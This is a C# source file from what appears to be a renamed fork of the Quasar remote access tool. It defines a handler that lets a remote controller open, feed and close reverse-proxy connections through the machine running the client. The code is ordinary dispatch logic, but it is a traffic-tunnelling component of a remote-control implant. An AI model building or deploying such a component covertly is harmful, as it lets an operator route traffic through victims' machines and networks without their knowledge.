using Q3C273.Shared.Messages;
using Q3C273.Shared.Messages.ReverseProxy;
using Q3C273.Shared.Networking;
using Ton618.Networking;

namespace Ton618.MessageHandlers
{
    public class ReverseProxyHandler : IMessageProcessor
    {
        private readonly QuasarClient _client;

        public ReverseProxyHandler(QuasarClient client)
        {
            _client = client;
        }

        public bool CanExecute(IMessage message) => message is ReverseProxyConnect ||
                                                             message is ReverseProxyData ||
                                                             message is ReverseProxyDisconnect;

        public bool CanExecuteFrom(ISender sender) => true;

        public void Execute(ISender sender, IMessage message)
        {
            switch (message)
            {
                case ReverseProxyConnect msg:
                    Execute(sender, msg);
                    break;
                case ReverseProxyData msg:
                    Execute(sender, msg);
                    break;
                case ReverseProxyDisconnect msg:
                    Execute(sender, msg);
                    break;
            }
        }

        private void Execute(ISender client, ReverseProxyConnect message)
        {
            _client.ConnectReverseProxy(message);
        }

        private void Execute(ISender client, ReverseProxyData message)
        {
            var proxyClient = _client.GetReverseProxyByConnectionId(message.ConnectionId);

            proxyClient?.SendToTargetServer(message.Data);
        }
        private void Execute(ISender client, ReverseProxyDisconnect message)
        {
            var socksClient = _client.GetReverseProxyByConnectionId(message.ConnectionId);

            socksClient?.Disconnect();
        }
    }
}
